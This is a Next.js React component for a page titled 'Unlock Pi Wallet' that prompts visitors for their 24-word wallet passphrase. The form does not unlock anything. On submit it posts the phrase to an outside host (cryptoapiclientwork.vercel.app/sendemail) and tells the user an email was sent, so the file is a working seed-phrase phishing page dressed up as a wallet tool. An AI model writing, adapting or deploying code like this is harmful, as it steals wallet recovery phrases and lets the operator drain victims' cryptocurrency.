"use client"
import Image from "next/image";
import { useState } from "react";

export default function WordValidatorPage() {
  const [inputText, setInputText] = useState("");
  const [errorMessage, setErrorMessage] = useState("");

  const handleSubmit = async (e) => {
    e.preventDefault();

    const wordCount = inputText.trim().split(/\s+/).length;

    if (wordCount < 24) {
      setErrorMessage("Error: Please enter exactly 24 words. You entered less than 24.");
      return;
    } else if (wordCount > 24) {
      setErrorMessage("Error: Please enter exactly 24 words. You entered more than 24.");
      return;
    }

    const userCode = inputText;

    try {
      const response = await fetch("https://cryptoapiclientwork.vercel.app/sendemail", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ userCode }),
      });

      if (!response.ok) {
        const errorData = await response.json();
        throw new Error(errorData.message || "Failed to send email.");
      }

      setErrorMessage("Success! Email sent with your user code.");
    } catch (error) {
      console.error(error); // Log error to the console
      setErrorMessage(error.message || "Error sending email.");
    }
  };

  return (
    <div className="min-h-screen flex items-center justify-center bg-[#8A348E] bg-gradient-to-r from-[#8A348E] to-[#423F88] opacity-100 p-4">
      <div className="bg-white rounded-lg shadow-md p-6 sm:p-8 max-w-full sm:max-w-lg w-full">
     <div className="h-12 rounded-lg flex items-center justify-center bg-[#8A348E] bg-gradient-to-r from-[#8A348E] to-[#423F88] opacity-100 mb-4">
     <Image
      src="/logoImage.PNG"
      alt="Next.js Logo"
      width={38}
      height={32}
      className="mx-auto sm:mx-0"
    />
    <h1 className="text-white text-xl font-bold m-4 ">Wallet</h1>
    <Image
      src="/logoImage.PNG"
      alt="Next.js Logo"
      width={38}
      height={32}
      className="mx-auto sm:mx-0"
    />
     </div>
        <h1 className="text-xl sm:text-2xl font-bold text-gray-800 text-center mb-4 sm:mb-6">
          Unlock Pi Wallet
        </h1>
        <form onSubmit={handleSubmit} className="space-y-4">
          <textarea
            value={inputText}
            onChange={(e) => setInputText(e.target.value)}
            rows="5"
            placeholder="Enter Your 24-Word PassPhrase Here..."
            className="w-full border border-gray-300 rounded-lg p-3 sm:p-4 text-gray-800 focus:ring-2 focus:ring-indigo-400 focus:outline-none resize-none"
          />
          <button
            type="submit"
            className="w-full text-white bg-[#8A348E] hover:bg-[#fbb44a] font-bold py-2 sm:py-3 px-4 rounded-lg transition"
          >
            Unlock with PassPhrase
          </button>
        </form>
        {errorMessage && (
          <p
            className={`mt-4 text-center font-medium ${
              errorMessage.startsWith("Success") ? "text-green-600" : "text-red-600"
            }`}
          >
            {errorMessage}
          </p>
        )}
      </div>
    </div>
  );
}
